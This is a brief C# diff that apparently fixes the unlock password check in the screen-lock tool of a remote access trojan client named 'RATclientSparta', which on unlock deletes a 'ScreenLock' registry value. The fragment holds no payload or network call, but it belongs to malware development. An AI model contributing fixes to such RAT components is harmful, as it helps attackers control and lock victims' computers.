@@ -25,7 +25,7 @@ namespace RATclientSparta.Tools.Screen
 
         private bool PasswordCheck()
         {
-            if (this.password != this.button1.Text)
+            if (this.password != this.textBox1.Text)
                 return false;
             Setup.RegistryData.RegistryDelete item = new Setup.RegistryData.RegistryDelete(); item.DeleteValue("ScreenLock");
             return true;
